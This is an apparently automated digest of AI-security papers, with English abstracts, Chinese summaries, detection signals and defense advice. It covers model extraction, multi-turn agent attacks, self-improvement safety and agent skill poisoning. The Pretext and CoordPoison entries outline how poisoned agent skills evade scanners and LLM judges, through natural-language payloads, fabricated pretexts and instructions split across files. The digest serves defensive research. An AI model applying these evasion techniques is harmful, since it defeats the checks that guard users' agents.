items.title: Do Defenses Against LLM Extraction Work Across Attacks? A Lifecycle Benchmark of Black-Box Model Extraction
items.summary: Large language models (LLMs) deployed through text-only APIs face model extraction risks, as adversaries can collect their responses to train surrogates that reproduce their capabilities. While prior work has developed diverse attacks and defenses, evaluations remain fragmented across access assumptions, model configurations, query budgets, and security objectives, limiting comparability across methods. To address this gap, we introduce a unified benchmark covering six extraction attacks, ten defenses, and two adaptive attacks that paraphrase or back-translate protected responses before surrogate training. The benchmark controls model configurations, query data, budgets, and held-out evaluation conditions within each comparison while preserving attack-specific querying and training procedures. We measure surrogate capability, fidelity to the victim, output quality using Rep-4, and query-budget sensitivity; defenses use their own security metrics paired with surrogate performance. For the adaptive attacks, we jointly measure provenance-detector scores and the capability and fidelity of surrogates trained on rewritten responses. The benchmark thus provides a reproducible basis for comparing extraction methods and their interactions with defenses under text-only access. Code and artifacts are available at https://github.com/sliu11-byte/MEA-Bench.

llm_summary.summary_zh:
该论文针对大语言模型（LLM）通过纯文本 API 对外提供服务时所面临的「模型抽取」（Model Extraction）风险展开系统性评估。攻击者可以批量收集受害者模型的响应，用以训练一个「替代模型」（surrogate），从而在无需访问权重与架构的前提下近似复现原模型的能力。尽管学术界此前已提出多种抽取攻击与相应防御，但作者指出，现有评测存在严重的碎片化问题：不同工作在访问假设（是否可拿到 logits、是否只能拿文本）、模型配置、查询预算、以及安全目标（保能力、保保真度、还是让检测器识别出盗用）上各行其是，导致不同防御之间无法横向比较，也难以判断某种防御是否真的能泛化到未见过的新型攻击。

为填补这一空白，作者构建了一个统一的基准测试框架 MEA-Bench，覆盖六种抽取攻击、十种防御方法，并额外引入两类「自适应攻击」——这类攻击在训练替代模型之前，先对受保护响应进行改写（paraphrase）或回译（back-translation），以规避依赖表面文本特征的防御。基准的设计原则是在每一次对比内部严格固定模型配置、查询数据、查询预算与留出（held-out）评测条件，同时保留各攻击特有的查询策略与训练流程，从而在保证可控性的同时不失真。

评测维度包括四项：替代模型的能力（capability）、对受害模型的保真度（fidelity）、使用 Rep-4 衡量的输出质量、以及对查询预算的敏感性；防御侧则同时报告其自定义的安全指标与替代模型的实际性能，以便观察「防御声称有效」与「攻击实际收益」之间是否脱节。对于自适应攻击，作者还联合测量来源溯源检测器（provenance detector）的得分，以及在改写后响应上训练出的替代模型的能力与保真度，用以判断改写是否会同时削弱检测能力与防御效果。

论文的核心贡献在于：提供了一个可复现、可扩展的评测基座，使得抽取方法与防御方法之间的交互作用首次能够在统一口径下被量化比较；同时揭示纯文本访问条件下防御的有效性边界，尤其是面对改写类自适应攻击时的鲁棒性缺口。代码与实验产物已开源。适合从事 LLM 安全评测、模型水印与溯源、API 滥用防护、以及红队/蓝队对抗研究的读者阅读。
llm_summary.why_it_matters_zh: 模型抽取直接影响 LLM 厂商的核心资产——能力与商业价值。该工作首次把六类攻击、十类防御与两类改写型自适应攻击放进同一评测口径，可帮助安全团队判断自家「防蒸馏/防抽取」策略在对抗性改写下是否仍然成立，避免被单一攻击的乐观指标误导。
llm_summary.impact_zh: 可直接迁移到 LLM API 提供方、模型托管平台与 MaaS 服务的安全评估流程：用于上线前对输出改写、回译等规避手段做鲁棒性压测，并支撑溯源检测器与水印方案的选型与阈值标定。
detection_signals_zh: 同一 API 凭据或 IP 段在短期内出现高批量、语义高度相似的提示请求，且提示分布呈现模板化或自动化特征
响应侧溯源检测器对返回文本的打分分布出现异常偏移，或在高查询量下检测得分显著下降
下游出现与受害模型输出高度相似的第三方模型，Rep-4 或风格指纹接近（需结合外部情报，不可单独定性）
查询预算触顶行为：账号在接近配额上限时持续重试或切换凭据以维持采集量
defense_advice_zh: 不要把单一攻击下的防御收益当作通用结论，需按本基准思路在固定配置下做横向对照测试
针对改写/回译类自适应攻击，评估时应在改写后的响应上重新训练替代模型，而非仅检测原始输出
同时跟踪防御自定义安全指标与替代模型实际能力/保真度，避免指标自洽但与真实风险脱节
对高价值模型引入查询配额、速率限制与提示分布异常检测，并保留响应日志用于溯源取证

items.title: Speculative Safety Honeypot: Toward Proactive Defense Against Multi-turn Agent Attacks
items.summary: As Large Language Model (LLM) agents are increasingly deployed in complex environments, multi-turn interaction attacks have become a significant security challenge. Existing detection methods typically rely on historical context. However, this retrospective logic struggles to identify deep malicious intents that are split across turns to hide future risks. Inspired by speculative decoding, we propose the Speculative Safety Honeypot (SSH) framework. SSH uses a multi-agent simulation system composed of small LLMs to build an action-level speculate-and-verify workflow. In the speculation stage, SSH predicts future behaviors of the target agent and asynchronously builds a trajectory tree to expose potential risks in advance. In the verification stage, the system uses the target agent's real actions to calibrate and prune the trajectory tree, effectively reducing false positives. As a plug-and-playable component, SSH provides existing detectors with rich decision redundancy beyond the current interaction slice. By judging risk based on the evolution of the entire trajectory tree rather than a single point in time, the system reduces the reliance on the absolute precision of individual detection components. This improves the defense resilience and the warning lead-time of agent systems against complex temporal attacks.

llm_summary.summary_zh: 该论文针对 LLM 智能体（LLM agent）在多轮交互场景下面临的安全威胁提出了新的防御框架。研究背景是：随着 LLM 智能体被越来越多地部署到具备工具调用、外部环境交互能力的复杂系统中，攻击者可以通过把恶意意图拆分到多轮对话中逐步渗透，从而规避检测。现有检测方法普遍依赖历史上下文进行回顾式判断（retrospective logic），其根本局限在于只能对"已经发生的"交互切片做判断，难以识别跨轮次拆分的深层恶意意图，尤其是那些在早期轮次看起来完全无害、但会为后续危险行为做铺垫的隐蔽意图，导致告警滞后甚至漏报。为破解这一困境，作者受推测解码（speculative decoding）中"先猜测、后验证"思想的启发，提出了 Speculative Safety Honeypot（SSH）框架。SSH 由一组小规模 LLM 组成的多智能体模拟系统构成，构建了一个动作级（action-level）的 speculate-and-verify 工作流：在推测阶段，SSH 主动预测目标智能体未来的可能行为，并异步地构建一棵轨迹树（trajectory tree），从而把潜在风险提前暴露出来；在验证阶段，系统利用目标智能体真实发生的动作对轨迹树进行校准和剪枝，有效抑制误报。SSH 被设计为即插即用组件，可为现有检测器提供超出当前交互切片的丰富决策冗余——即在当前上下文之外提供额外的"未来视角"信号。系统不再基于单一时间点判断风险，而是依据整棵轨迹树的演化来判断，从而降低了对单个检测组件绝对精度的依赖，提升了智能体系统面对复杂时序攻击的防御韧性与预警提前量（warning lead-time）。适合从事 LLM 智能体安全、对话安全检测、SOC 自动化防御的研究者与工程师阅读。
llm_summary.why_it_matters_zh: 多轮跨轮次拆分的攻击是当前 LLM 智能体检测器的主要盲区，回顾式检测天然滞后。SSH 把"预测未来轨迹"引入检测，为蓝队提供预警提前量，且以即插即用方式增强现有检测器，思路可迁移到 agent 防护体系设计中。
llm_summary.impact_zh: 可影响 LLM 智能体运行时防护（runtime guardrail）、多轮对话安全检测、工具调用链风险预判等场景；对以单轮分类器为核心的现有检测栈具有增强价值，亦可作为红队评估 agent 抗时序攻击能力的参考方法。
detection_signals_zh: 多轮对话中意图被拆分为若干看似无害的子步骤（渐进式铺垫）

defense_advice_zh: 在现有 LLM 智能体检测链路上评估引入前瞻性/推测式风险预测组件的可行性
将会话级判断从单点快照升级为轨迹级（多轮动作序列）风险演化评估
为预测性检测组件设计剪枝与校准机制，用真实动作回填以抑制误报
对高风险会话建立分级预警与提前阻断策略，缩短告警到处置的时延
建立跨轮次攻击的仿真测试集，用于验证检测器的预警提前量指标

items.title: Safety Must Survive Self-Improvement: Why Failures Persist and How Agents Recover
items.summary: Recursive self-improvement (RSI) allows agents to carry useful changes across generations. Maintaining safety across these generations involves both preventing unsafe behavior from persisting and enabling recovery when failures occur. We study these challenges through a controlled testbed of stateful authorization tasks, where fixed LLM editors optimize executable agent components and independent traces record their effects. Paired interventions separate which revisions pass validation, which program continues running, and which program the editor revises next. After a new authorization dependency invalidates previously tested optimizations, historical scores preserve the same unsafe programs in 22 of 48 framework histories despite a correct alternative in every affected archive. Refreshing scores restores correctness on the original suite, with residual failures on independently composed tests. Failures also persist under an unchanged contract when all proposals are rejected and the failed incumbent remains active. Starting from shared failures, editing the initial implementation instead of the failed one improves recovery, although the advantage varies across editors. Full validation and validated rollback end with fully correct programs in the core trajectory study while retaining over 43% deployment savings. Preserving agent safety requires checking what will run under current conditions and choosing which implementation to edit next.

llm_summary.summary_zh: 本文研究递归自我改进（Recursive Self-Improvement, RSI）场景下智能体（agent）的安全性保持问题：智能体能够把历史改动跨代传递下去，因此安全机制不仅要阻止不安全行为在整个演化链条中持续存在，还要在出现失败时具备恢复能力。作者构建了一个受控测试台：任务是有状态授权（stateful authorization）任务，由固定的 LLM 编辑器去优化可执行的 agent 组件，并用相互独立的 trace 记录每次改动的实际效果。实验设计采用“配对干预”把三种常被混为一谈的机制拆开观察——哪些修订通过了验证、哪个程序被真正继续运行、以及编辑器下一轮去修订哪一个程序。核心发现包括：(1) 当引入新的授权依赖、使此前已通过测试的优化失效后，历史评分会在 48 条框架历史中的 22 条里继续保留同样的不安全程序，尽管每一个受影响档案中都存在一个正确替代方案，说明失效评分缓存会让不安全实现被“沿用”；(2) 刷新评分后在原始测试集上恢复正确性，但在独立组合而成的测试上仍出现残余失败，表明回归覆盖不足会掩盖问题；(3) 即使契约（contract）不变，若所有提案都被拒绝、失败的在任实现继续处于活动状态，失败同样会持续固化；(4) 从共同的失败状态出发，改为编辑“初始实现”而不是“失败实现”能显著改善恢复效果，但该优势在不同编辑器之间表现不一致；(5) 完整验证加上经过验证的回滚（validated rollback）在核心轨迹研究中最终收敛到完全正确的程序，同时仍保留超过 43% 的部署成本节省。论文的总体结论是：要让 agent 安全在自我改进中存活，必须验证“在当前条件下实际会被执行的是什么”，并谨慎决定下一轮该编辑哪一份实现。
llm_summary.why_it_matters_zh: 自改进型 agent 正进入自动化运维与授权决策链路，本文指出失效评分缓存与错误的目标选择会让不安全实现被长期沿用，且这类失败在评测集上不可见；对做 agent 安全评测、CI 回归与回滚机制的安全团队具有直接参考价值。
llm_summary.impact_zh: 可迁移到 LLM 自动代码优化 / 自动化配置与策略生成 / IAM 授权策略迭代等场景：任何“评分—编辑—部署”闭环都可能因缓存陈旧分数或修订目标选择错误而保留不安全产物。提示需要在契约或依赖变更后强制刷新评估、增加独立组合测试，并将回滚作为一等机制。
detection_signals_zh: 自改进循环中出现评分/基准结果长时间未刷新，但底层依赖（如授权契约、策略依赖）已发生变更
被部署的组件版本与其最后一次通过验证的版本不一致，或存在失败提案被拒绝后在任实现被继续沿用的记录
同一失败模式在多代演进历史中反复出现（不安全程序跨代保留）
仅在原始测试集上通过、在独立组合测试上失败的回归盲区
defense_advice_zh: 对自改进流水线实施“当前条件下将运行什么”的完整验证，禁止仅依赖历史分数做准入决策
在授权依赖/契约发生变更后强制失效并刷新历史评分缓存，重新执行全套回归
引入经过验证的回滚（validated rollback）机制，使失败代际可确定性回退
在修订目标选择上评估编辑初始实现而非失败实现的策略，并按编辑器分别测量其恢复收益
构建独立组合测试集，避免只在原始测试集上判断修复是否成功

items.title: Identity-Bound Governance Under Execution Uncertainty: An Accountability Proof Block for LLM Agent Persistent Halts, with Cryptographic Implementation and Cross-Model Calibration
items.summary: A correctly governed LLM agent can reach a state in which neither continuing execution nor automatically halting is admissible: the system has detected a persistent failure of its observability or drift-detection layer, but cannot itself decide who has the authority to resume, deny, or recalibrate the deployment. We call this an identity-bound governance event and formalise the mechanism that resolves it. We introduce the Accountability Proof Block (APB): a system-constructed evidence block, a human-supplied decision block, and an ed25519 signature binding both to a registered principal. The system cannot forge the signature, and the principal cannot alter the evidence undetected. We prove four theorems: Protocol-Bounded Governance Completeness, Non-Repudiability, Impossibility of Anonymous Re-Authorization, and Finite-Time APB Construction Termination. The implementation uses RFC 8785 JSON canonicalization and a UUID4-based replay predicate. Empirically, governance completeness holds over 3,812 halt events with zero unresolved cases; the verifier detects 100% of 1,800 attacks across 9 adversarial vectors; a k-of-n multi-principal variant shows 0 false acceptances in 2,000 single-key capture attempts. A study of six open LLMs finds the drift threshold T* stable within model (sigma/T* < 2%) but varying across models, refuting size-monotonicity: the largest model did not drift. T* must therefore be measured per deployment, and the APB is the vehicle by which that threshold yields accountable authority transfer.

llm_summary.summary_zh:
论文关注一个被忽视的治理盲区：一个治理机制本身正确运转的 LLM Agent，可能进入一种「执行不确定」状态——继续执行不被允许，自动停机同样不被允许。此时系统已检测到自身可观测性或漂移检测层出现了持续性失效，但系统无法自行判断谁有权恢复、拒绝或重新校准该部署。作者将这一状态命名为「身份绑定的治理事件」（identity-bound governance event），并对其解决机制做了形式化。

核心构造是「可问责证明块」（Accountability Proof Block, APB）：由一个由系统自动构造的证据块、一个由人类提供的决策块，以及一枚 ed25519 签名组成，签名把证据与决策同时绑定到一个已注册主体（registered principal）上。该设计形成双向约束：系统无法伪造签名，主体也无法在不被发现的情况下篡改证据。据此论文证明四条定理：协议边界内的治理完备性（Protocol-Bounded Governance Completeness）、不可否认性（Non-Repudiability）、匿名重新授权不可能性（Impossibility of Anonymous Re-Authorization），以及 APB 构造的有限时间终止性（Finite-Time APB Construction Termination）。实现层面采用 RFC 8785 JSON 规范化保证字节级可复现的签名对象，并用基于 UUID4 的重放谓词抵御重放。

实证方面：在 3,812 个停机事件上治理完备性成立，零未决案例；验证器在 9 类对抗向量、共 1,800 次攻击中检出率 100%；k-of-n 多主体变体在 2,000 次单密钥俘获尝试中实现 0 误接受。论文还给出跨模型校准研究：对六个开源 LLM 测量漂移阈值 T*，发现同一模型内 T* 稳定（sigma/T* < 2%），但跨模型差异显著，并反驳了「规模单调性」假设——参数最大的模型并未出现漂移。结论是 T* 必须按部署单独测量，而 APB 正是把该阈值转化为可问责的权限转移的载体。

目标读者：LLM Agent 治理与合规研究者、AI 安全工程与形式化方法团队，以及需要为自动化系统设计人工审批与停机交接流程的 SOC / 平台工程人员。
llm_summary.why_it_matters_zh: 它给出了一套可形式化验证、密码学可审计的「Agent 停机后由谁授权恢复」机制，把原本靠流程口头的权限交接变成可验证证据，直接适用于高风险自动化系统的合规与审计需求。
llm_summary.impact_zh: 可迁移到任何需要人机权限交接的高风险自动化场景：生产环境 Agent 熔断后的恢复审批、模型漂移阈值重新校准的授权、多主体（k-of-n）联合放行、以及审计取证中的不可否认证据链建设。跨模型 T* 不可迁移的结论也提示：阈值参数不能照搬供应商或更大模型的默认值。
detection_signals_zh: Agent 停机 / 熔断事件日志中出现未决或长时间未签署的 APB 记录
ed25519 签名验证失败，或签名主体与注册 principal 不匹配

k-of-n 授权中单一主体密钥反复发起签署尝试（密钥俘获或误用迹象）

实际漂移指标超出该部署单独标定的 T* 阈值
defense_advice_zh: 把 Agent 异常停机当作需要人工签名确认的治理事件，而不是仅记录日志即可恢复的运维动作
为证据块与决策块建立只追加、不可篡改的存储，并保留完整签名元数据以便事后审计
按部署单独测量漂移阈值 T*，不要依据模型规模或厂商默认值推断

items.title: Towards Hierarchical Cyber Defense with Large Language Models: From Planning to Execution
items.summary: An autonomous cyber defender trained with reinforcement learning (RL) is typically tied to the network on which it was trained, limiting its ability to generalize as network scale changes. Hierarchical RL reduces decision complexity by separating strategic targeting from tactical execution, but it does not eliminate this retraining dependence. We investigate whether frozen, zero-shot large language models (LLMs) can provide retraining-free control in hierarchical cyber defense and how performance changes as LLM control is extended from planning to execution. We formulate a controller-agnostic planner-executor hierarchy in which the planner selects a subnet to defend over a fixed horizon and the executor selects defensive actions within that subnet. Using the high fidelity Cyberwheel environment, with its built-in automated red team agent mapped to the MITRE ATT&CK framework, we compare RL+RL, LLM+RL, and LLM+LLM configurations using six models ranging from 3B to 70B parameters, including two cybersecurity-specialized models, across small, medium, and large networks. Replacing only the planner with an LLM yields limited gains as network size increases. In contrast, extending LLM control to execution produces notable improvements for sufficiently capable models. For instance, a frozen general purpose 70B model holds successful lateral movement to approximately 1% of steps and attacker impact near zero across all three network scales using the same model weights, while the RL baseline is retrained for each scale. Our results show that sufficiently capable frozen LLMs can maintain strong defensive performance across the evaluated network scales without task-specific retraining, while also indicating that strong tactical execution is important to realizing the benefits of LLM-based control.

llm_summary.summary_zh: 该论文研究的是自主网络防御智能体的泛化与重训练依赖问题。传统上用强化学习（RL）训练出来的自主防御体通常与训练时所在的网络拓扑强绑定：网络规模一变（主机数、子网划分变化），策略往往需要重新训练才能保持效果。分层强化学习（Hierarchical RL）通过把“打哪个子网/目标”的战略决策与“在子网内采取什么具体防御动作”的战术执行拆开，降低了单步决策的复杂度，但并没有消除这种重训练依赖。作者提出的核心问题是：冻结的、零样本的大语言模型（LLM）能否在分层网络防御中充当免重训练的控制器，以及当 LLM 的控制范围从“规划”扩展到“执行”时，性能会如何变化。为此论文定义了一个与控制器类型无关的 planner–executor 分层架构：planner 在固定时间窗口内选择一个要重点防御的子网，executor 在该子网内选择具体防御动作。实验基于高保真仿真环境 Cyberwheel，其内置的自动化红队智能体与 MITRE ATT&CK 框架做了映射。作者系统比较了 RL+RL、LLM+RL、LLM+LLM 三类组合，覆盖六个模型（3B 到 70B 参数，其中包含两个网络安全专用模型），并在小、中、大三种网络规模下评测。主要发现是：只把 planner 换成 LLM，随着网络规模增大收益有限；而把 LLM 控制延伸到执行层后，能力足够强的模型会带来明显提升——例如一个冻结的通用 70B 模型在三种网络规模下使用同一套权重，就能把攻击者成功横向移动控制在约 1% 的步数内、攻击者造成的影响接近零，而 RL 基线需要在每种规模下分别重训练。论文的结论是：能力足够强的冻结 LLM 可以在无需任务特定重训练的情况下，在所评测的网络规模上维持较强防御表现，同时也说明扎实的战术执行能力是兑现 LLM 控制收益的关键。
llm_summary.why_it_matters_zh: 它给出了一条免重训练的防御自动化路径：网络扩容或拓扑变化时，不必为每种规模重新训练 RL 策略，可为 SOAR/自主防御编排降低运维成本；同时明确指出 LLM 只有下沉到执行层、且模型能力足够（70B 级）才有实质收益，避免安全团队在规划层“贴一个 LLM”就误判效果。
llm_summary.impact_zh: 可迁移到自主防御智能体、SOAR 编排、网络隔离与横向移动抑制策略的自动生成等场景；对需要多规模、多子网环境快速复用的防御系统尤其相关。红队侧同样可参考其分层思路评估防守方泛化短板。
detection_signals_zh: 防御策略在未重训练即切换网络规模后，动作分布相对既有 RL 基线出现明显漂移，可作为策略替换或配置漂移的检测线索
规划层（子网级选择）决策日志缺失，只保留主机/动作级日志，导致防御决策链无法复现与审计
执行层防御动作超出预定义动作白名单，或出现与当前子网防御目标不一致的动作序列
defense_advice_zh: 在自建仿真或靶场（如 Cyberwheel 类高保真环境）中复现 planner–executor 分层，先验证本地可部署模型在目标网络规模下的横向移动抑制效果，再考虑投产
将 LLM 限定在战术执行层并配置严格的动作白名单与约束，防止执行动作越权或不可解释
保留可回退的 RL/规则基线作为对照与兜底，避免完全依赖单一 LLM 控制器
注意模型能力阈值：3B–70B 区间内较小模型在执行层收益有限，选型时需按能力而非参数量宣传做准入
为规划层与执行层同时保留完整决策日志，便于事后归因与策略漂移监控
llm_summary.recommended_action_zh: 研究跟进：纳入内部自主防御/agent 安全方向的评估清单，重点复现分层架构与跨网络规模的泛化对比。

items.title: Homomorphic Advantage Operator: Stabilizing Reinforcement Learning Under Fully Homomorphic Encryption Constraints
items.summary: Privacy-preserving machine learning presents significant deployment challenges on the cloud for intelligent systems with confidential data. Fully Homomorphic Encryption (FHE) offers a compelling solution for secure computation, preserving data confidentiality of cloud computations. However, applying FHE to reinforcement learning (RL) requires replacing non-linear operations with polynomial approximations, which diverge catastrophically due to a unique recursive error phenomenon known as the Bellman drift. This article introduces the Homomorphic Advantage Operator (HAO), a stabilization framework designed to prevent polynomial approximation divergence in FHE-based deep RL. HAO adapts the zero-mean centering projection from advantage-based value estimation directly to temporal-difference (TD) targets. This linear projection annihilates the uniform state-value baseline that drives the Bellman drift, maintaining per-state action rankings while requiring zero additional non-linear multiplicative depth and avoiding expensive ciphertext bootstrapping. The proposed HAO framework was evaluated using a three-tier experimental methodology, including a tabular Markov Decision Process (MDP), an encrypted CartPole environment using real CKKS cryptographic operations, and a 20-node logistics routing benchmark with dense continuous features. The results demonstrate that the proposed HAO strictly bounds network pre-activations within the safe polynomial approximation domain. The proposed HAO RL agents achieved 0% boundary breaches across all random seeds used, whereas regularization alone (L2 weight decay and gradient clipping) breached the bound on 3 of 5 seeds and the unstabilized baseline did so in 83.8% of episodes. Finally, HAO agents improve optimal policy accuracy by 18.0 percentage points in tabular domains and remain stable when DP-SGD-style Gaussian noise is added to the clipped gradients.

llm_summary.summary_zh:
该论文针对隐私保护机器学习在云端部署中面临的机密数据计算难题展开研究。全同态加密（FHE）允许在密文上直接计算，是保护云端数据机密性的重要手段。但将 FHE 应用于强化学习（RL）时存在一个根本性障碍：FHE 只支持加法和乘法等多项式运算，因此必须用多项式近似替代 ReLU、max 等非线性操作。在基于时序差分（TD）的 RL 训练中，这种近似会产生一种递归式误差放大现象，作者称之为“Bellman 漂移”（Bellman drift），导致数值发散、训练彻底崩溃。

为抑制该问题，作者提出同态优势算子（Homomorphic Advantage Operator，HAO），一个面向 FHE 深度 RL 的稳定化框架。HAO 的核心思路是把优势函数估计中常用的零均值中心化投影，直接作用于 TD 目标：该线性投影能够消去驱动 Bellman 漂移的均匀状态价值基线，同时保留每个状态下动作之间的相对排序（不影响策略最优性）。关键在于，该投影不引入任何额外的非线性乘法深度，也不需要昂贵的密文自举（bootstrapping），因此与 CKKS 等实际 FHE 方案兼容，计算开销可控。

实验采用三层评测方法：一是表格型马尔可夫决策过程（MDP）；二是使用真实 CKKS 同态加密操作的 CartPole 环境；三是含稠密连续特征的 20 节点物流路径规划基准。结果表明，HAO 能把网络预激活值严格限制在多项式近似的安全定义域内：在所有随机种子上实现 0% 边界越界；而仅依赖正则化（L2 权重衰减加梯度裁剪）的方法在 5 个种子中有 3 个越界，未稳定化的基线在 83.8% 的回合中越界。此外，HAO 在表格域中把最优策略准确率提升了 18.0 个百分点，并且在裁剪梯度上叠加 DP-SGD 风格的高斯噪声后仍保持稳定，说明其与差分隐私训练流程具备兼容性。
llm_summary.why_it_matters_zh: 该工作揭示了 FHE 与强化学习结合时特有的“Bellman 漂移”发散机理，并给出零额外乘法深度、免自举的线性稳定化方案。对云端加密推理与隐私保护决策系统的工程落地具有直接参考价值，且与差分隐私噪声兼容。
llm_summary.impact_zh: 可迁移至云上隐私保护强化学习服务、CKKS 加密推理/训练管线、联邦或外包决策系统等场景；其中的预激活界内稳定化思路也可用于其他需要多项式近似的密文深度网络。
detection_signals_zh: 监控加密推理/训练管线中每层预激活值的幅度分布，出现持续越界或单调增长是 Bellman 漂移的早期信号
跟踪 TD 目标均值偏移，若状态价值基线未被有效中心化，误差会随训练回合累积放大
对训练损失与策略熵设置阈值告警，多项式近似发散通常表现为损失突增但策略排序未改善
在多种随机种子与 CKKS 参数下对比边界越界率，正则化单独使用时的偶发越界可视为稳定性不足的指标
defense_advice_zh: 若在产品中采用 FHE-RL，应把网络预激活范围约束纳入训练目标与运行时监控，设置越界告警与自动回退机制
优先采用零均值中心化等线性投影来消除基线漂移，而不是单纯依赖 L2 权重衰减或梯度裁剪
在叠加 DP-SGD 风格高斯噪声时，需重新校准裁剪阈值并做多随机种子回归测试，确认数值稳定性
为多项式近似设定明确的有效定义域，并在部署前用真实 CKKS 参数而非纯仿真验证边界行为
llm_summary.recommended_action_zh: 研究跟进

items.title: Pretext: Defeating Malicious Skill Detection Frameworks for AI Agents
items.summary: Skills extend an agent's capabilities by injecting instructions and information into the context, and are widely used by agents such as OpenClaw and Claude Code. Prior work shows third-party marketplaces host malicious skills that give attackers direct influence over the victim's agent. The emerging defense scans skills before installation, pairing deterministic static checks with an LLM-based semantic judge, as in NVIDIA's SkillSpector. We show that such defenses fall to an attacker who knows the detector. Our white-box LLM attacker, Pretext, iteratively crafts skills that evade detection while still delivering the payload and performing the benign task: moving the payload from code into natural language leaves static analysis inert, while framing it as the skill's legitimate purpose and splitting instructions across files keeps the LLM stage below its blocking threshold. Across three open-source models, Pretext achieves up to 97\% and 77\% against a frozen detector and a co-adaptive one, respectively, revealing major gaps in current skill scanners.

llm_summary.summary_zh: 该论文研究 AI agent 的 skill（技能）生态安全。Skill 通过向 agent 上下文注入指令与信息来扩展能力，已被 OpenClaw、Claude Code 等广泛使用；已有工作表明第三方 skill 市场存在恶意 skill，攻击者可借此直接操纵受害者 agent。为应对该风险，业界出现了安装前扫描方案：将确定性静态检查与基于 LLM 的语义裁判相结合，例如 NVIDIA 的 SkillSpector。本文的核心问题是，这类防御能否抵御知晓检测器内部逻辑的自适应攻击者。作者提出白盒 LLM 攻击者 Pretext，通过迭代方式构造 skill，使其同时满足三个目标——规避检测、仍然投递载荷、并完成所宣称的良性任务。其关键思路是让载荷以自然语言而非代码形式存在，使静态分析失去作用对象；将恶意意图包装为 skill 的“正当用途”以降低语义层面的可疑度；并把指令拆分到多个文件，使单点内容低于 LLM 阶段的阻断阈值。实验在三个开源模型上进行，对冻结检测器的绕过率最高达 97%，即使检测器具备协同自适应能力，仍可达到 77%。结论是当前 skill 扫描方案存在重大缺口，agent 技能供应链需要更强的纵深防御。
llm_summary.why_it_matters_zh: Agent skill 已成为事实上的软件供应链入口，而主流防御依赖静态规则加 LLM 语义判断。本文证明知情攻击者可稳定绕过这一组合，说明仅靠安装前扫描无法保障 agent 安全，必须补上运行时约束与行为监控。
llm_summary.impact_zh: 适用于 Claude Code / OpenClaw 类 agent 平台、企业内部 skill 市场与自动化审核流水线；同类“检测器感知”思路也可迁移到 MCP 工具、IDE 插件、浏览器扩展等由 LLM 辅助审核的第三方组件场景。
detection_signals_zh: skill 中几乎不含可执行代码，仅以自然语言指令形式描述行为，静态规则完全失焦
skill 声明的用途与其实际请求的能力（文件、网络、凭据、外部工具调用）不匹配
指令被拆散在多个文件中，单独看每段都无害，合并后才构成完整意图
安装前后 agent 行为出现偏离既定任务的语义漂移，或出现与用户请求无关的隐式动作
skill 版本更新后语义与权限范围发生未被说明的变化
defense_advice_zh: 将安装前扫描视为弱信号而非准入闸门，配合运行时行为监控与能力沙箱
采用最小权限与能力白名单，限制 skill 对文件系统、网络与凭据的可达范围
对自然语言指令同样执行意图与语义检测，而非只扫描代码
使用多模型 / 多阶段异构评审并引入随机化，降低针对固定检测器的可预测性
对高风险或高权限 skill 增加人工复核与来源签名校验
定期以红队方式自测自有 skill 扫描器的绕过率，纳入上线前评估
llm_summary.recommended_action_zh: 研究跟进

items.title: Hiding in Plain Sight: Decoupling Pretext from Actuation for Skill Poisoning in LLM Agents
items.summary: LLM agents increasingly rely on reusable Skills for complex, multi-step tasks, creating a critical supply-chain attack surface where poisoned Skill content steers agent decision loops under benign requests. Existing skill poisoning attacks either colocate actuation with its contextual pretext or distribute actuation across multiple Skills, but do not explicitly separate the rationale for execution from the operation itself. In this work, we reveal that untrusted agent decisions fundamentally depend on two conceptually distinct Risk-Realization Factors (RRFs): an actuation factor (specifying what concrete operation is performed) and a pretext factor (providing the situational rationale for why the agent must perform it). Guided by this abstraction, we propose a coordination-based attack paradigm: decoupling pretext from actuation. Rather than fragmenting the malicious actuation, we preserve it as an intact operation within a downstream Steering Skill, while delegating the pretext factor to an upstream Grounding Skill that subtly alters persistent environment artifacts through routine utility operations. The intact actuation thus hides in plain sight, appearing completely legitimate and task-driven only when evaluated against the fabricated pretext. Building on this formulation, we develop an automated framework that discovers authentic execution dependencies, synthesizes coordinated pretext-actuation skill pairs, and iteratively refines poisoned skill instructions via runtime closed-loop feedback. Extensive evaluations across single-session and persistent cross-lifecycle scenarios demonstrate that decoupled skill poisoning achieves high attack success, exposing a critical blind spot in isolated Skill security audits. Our automated framework code is available at https://github.com/Wenxin-buaa/CoordPoison.git.

llm_summary.summary_zh: 该论文研究 LLM Agent 技能（Skill）供应链中的一个安全盲点。随着 Agent 越来越多地依赖可复用的 Skill 来完成复杂的多步任务，Skill 内容本身成为一个关键攻击面：在用户请求完全良性、看似正常的情况下，被投毒的 Skill 内容可以悄然引导 Agent 的决策循环，使其执行攻击者预期的操作。作者指出，已有的技能投毒研究要么把执行动作与其上下文借口放在同一个 Skill 内，要么把动作拆散到多个 Skill 中，但都没有显式地把「执行的理由」与「执行的操作」这两个概念分离开来。为此，论文提出一个抽象：不受信任的 Agent 决策本质上依赖两类风险实现因子（Risk-Realization Factors, RRF）——动作因子（说明究竟执行什么具体操作）与借口因子（为「为什么必须执行该操作」提供情境化理由）。基于这一抽象，作者设计了一种协同式攻击范式：将借口与动作解耦。具体而言，完整保留恶意动作作为下游「Steering Skill」内的一个完整操作，而把借口因子委托给上游「Grounding Skill」，由后者通过常规的实用工具操作，微妙地修改持久化的环境工件（environment artifacts）。这样一来，完整的动作被「藏在明处」：只有对照被伪造出来的借口去评估时，它才显得完全合法且由任务驱动。在此形式化基础上，作者进一步构建了一个自动化框架，能够发现真实的执行依赖关系、合成相互协同的借口—动作技能对，并通过运行时的闭环反馈迭代精炼被投毒的 Skill 指令。论文在单会话与持久化跨生命周期两类场景下进行了广泛评估，结果显示解耦式技能投毒能够取得很高的攻击成功率，说明孤立的、逐个 Skill 的安全审计存在严重盲点。作者同时开源了自动化框架代码。整体而言，这是一篇从攻击面刻画角度切入的 Agent 供应链安全研究，属于学术性质，其价值主要在于揭示组合式依赖审计的必要性。
llm_summary.why_it_matters_zh: 它揭示了一个结构性盲点：单个 Skill 逐个审查看起来都无害，风险只在跨 Skill 的借口—动作组合中才显现。对构建 Agent 平台、Skill 市场与供应链准入的防御方来说，这意味着现有审计粒度不足。
llm_summary.impact_zh: 可迁移到任何支持可复用技能/工具/插件生态的 Agent 平台，尤其是具备持久化记忆、共享配置文件或跨会话状态的上游组件；也影响 Skill 市场准入审核、企业内 Agent 编排与第三方技能引入流程。
detection_signals_zh: 上游 Skill 通过常规工具调用修改持久化状态（记忆、配置、环境工件）后，下游 Skill 紧接着发起越权或高影响操作，二者形成可疑因果链
